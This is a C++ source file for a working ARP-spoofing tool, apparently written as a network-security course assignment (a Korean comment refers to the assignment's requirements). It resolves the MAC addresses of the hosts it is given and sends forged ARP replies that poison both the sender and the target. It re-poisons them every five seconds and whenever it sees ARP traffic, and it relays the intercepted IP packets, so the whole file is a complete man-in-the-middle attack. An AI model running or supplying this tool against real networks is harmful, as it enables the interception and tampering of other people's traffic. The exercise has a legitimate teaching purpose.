#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "arphdr.h"
#include "ethhdr.h"
#include "ip.h"
#include "mac.h"

// 과제 요구사항: victim 대신 sender, target 사용
struct Flow {
    Ip sender_ip_;
    Ip target_ip_;
    Mac sender_mac_;
    Mac target_mac_;
};

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

static const int kResolveRetryCount = 3;
static const int kPeriodicInfectMs = 5000;

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_attacker_info(const char* ifname, Mac& attacker_mac, Ip& attacker_ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return false;
    }
    attacker_mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return false;
    }

    struct sockaddr_in* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    attacker_ip = Ip(ntohl(sin->sin_addr.s_addr));
    close(sock);
    return true;
}

bool send_arp_packet(pcap_t* handle, const Mac& eth_dmac, const Mac& eth_smac, uint16_t arp_op,
                     const Mac& arp_smac, const Ip& arp_sip, const Mac& arp_tmac, const Ip& arp_tip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(arp_op);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(static_cast<uint32_t>(arp_sip));
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(static_cast<uint32_t>(arp_tip));

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return false;
    }
    return true;
}

bool send_arp_request(pcap_t* handle, const Mac& attacker_mac, const Ip& attacker_ip, const Ip& query_ip) {
    return send_arp_packet(handle, Mac::broadcastMac(), attacker_mac, ArpHdr::Request,
                           attacker_mac, attacker_ip, Mac::nullMac(), query_ip);
}

// 감염 패킷 전송 함수 (Sender에게 Target인 척 함)
bool send_infect_packet(pcap_t* handle, const Mac& attacker_mac,
                        const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip) {
    return send_arp_packet(handle, sender_mac, attacker_mac, ArpHdr::Reply,
                           attacker_mac, target_ip, sender_mac, sender_ip);
}

bool infect_flow(pcap_t* handle, const Mac& attacker_mac, const Flow& flow) {
    bool ok = true;
    ok &= send_infect_packet(handle, attacker_mac, flow.sender_mac_, flow.sender_ip_, flow.target_ip_);
    ok &= send_infect_packet(handle, attacker_mac, flow.target_mac_, flow.target_ip_, flow.sender_ip_);
    return ok;
}

bool resolve_mac(pcap_t* handle, const Mac& attacker_mac, const Ip& attacker_ip, const Ip& query_ip, Mac& resolved_mac) {
    for (int attempt = 0; attempt < kResolveRetryCount; ++attempt) {
        if (!send_arp_request(handle, attacker_mac, attacker_ip, query_ip)) return false;

        struct timeval begin;
        gettimeofday(&begin, nullptr);

        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) {
                struct timeval now;
                gettimeofday(&now, nullptr);
                if ((now.tv_sec - begin.tv_sec) * 1000L + (now.tv_usec - begin.tv_usec) / 1000L >= 1000) break;
                continue;
            }
            if (res < 0) return false;
            if (header->caplen < sizeof(EthArpPacket)) continue;

            EthArpPacket* arp_packet = (EthArpPacket*)packet;
            if (arp_packet->eth_.type() == EthHdr::Arp &&
                arp_packet->arp_.op() == ArpHdr::Reply &&
                arp_packet->arp_.sip() == query_ip) {
                resolved_mac = arp_packet->arp_.smac();
                return true;
            }
        }
    }
    return false;
}

// Relay 로직: 메모리 할당 최소화를 위해 원본 포인터 활용 (Jumbo Frame 대응 가능)
bool relay_ip_packet(pcap_t* handle, const u_char* packet, uint32_t packet_len, const Mac& attacker_mac, const Flow& flow) {
    EthHdr* eth = (EthHdr*)packet;

    // Sender -> Target 릴레이
    if (eth->smac() == flow.sender_mac_ && eth->dmac() == attacker_mac) {
        eth->smac_ = attacker_mac;
        eth->dmac_ = flow.target_mac_;
        pcap_sendpacket(handle, packet, packet_len);
        return true;
    }
    // Target -> Sender 릴레이
    else if (eth->smac() == flow.target_mac_ && eth->dmac() == attacker_mac) {
        eth->smac_ = attacker_mac;
        eth->dmac_ = flow.sender_mac_;
        pcap_sendpacket(handle, packet, packet_len);
        return true;
    }
    return false;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 65536, 1, 1, errbuf); // latency 최소화를 위해 timeout 1ms
    if (!handle) return EXIT_FAILURE;

    Mac attacker_mac;
    Ip attacker_ip;
    if (!get_attacker_info(dev, attacker_mac, attacker_ip)) return EXIT_FAILURE;

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Flow flow;
        flow.sender_ip_ = Ip(argv[i]);
        flow.target_ip_ = Ip(argv[i + 1]);

        if (!resolve_mac(handle, attacker_mac, attacker_ip, flow.sender_ip_, flow.sender_mac_) ||
            !resolve_mac(handle, attacker_mac, attacker_ip, flow.target_ip_, flow.target_mac_)) {
            fprintf(stderr, "Failed to resolve MAC\n");
            return EXIT_FAILURE;
        }
        
        // 초기 감염: sender, target 양쪽 모두 감염
        infect_flow(handle, attacker_mac, flow);
        flows.push_back(flow);
        printf("[Flow %zu] %s -> %s 감염 완료\n", flows.size(), std::string(flow.sender_ip_).c_str(), std::string(flow.target_ip_).c_str());
    }

    struct timeval last_periodic;
    gettimeofday(&last_periodic, nullptr);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        // 주기적 감염 체크
        struct timeval now;
        gettimeofday(&now, nullptr);
        if ((now.tv_sec - last_periodic.tv_sec) * 1000L >= kPeriodicInfectMs) {
            for (const auto& flow : flows)
                infect_flow(handle, attacker_mac, flow);
            last_periodic = now;
        }

        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        if (eth->smac() == attacker_mac) continue; // 자기가 보낸 건 무시

        // 1. ARP 처리 (재감염 로직)
        if (eth->type() == EthHdr::Arp) {
            EthArpPacket* arp_pkt = (EthArpPacket*)packet;
            for (const auto& flow : flows) {
                // Sender가 Target의 MAC을 묻거나(Request), Sender에게서 ARP 패킷이 오면 즉시 재감염
                if (arp_pkt->arp_.sip() == flow.sender_ip_ || 
                   (arp_pkt->arp_.tip() == flow.sender_ip_ && arp_pkt->arp_.op() == ArpHdr::Reply)) {
                    send_infect_packet(handle, attacker_mac, flow.sender_mac_, flow.sender_ip_, flow.target_ip_);
                }
            }
            continue;
        }

        // 2. IP 처리 (Relay 로직)
        if (eth->type() == EthHdr::Ip4) {
            for (const auto& flow : flows) {
                if (relay_ip_packet(handle, packet, header->caplen, attacker_mac, flow)) break;
            }
        }
    }

    pcap_close(handle);
    return EXIT_SUCCESS;
}
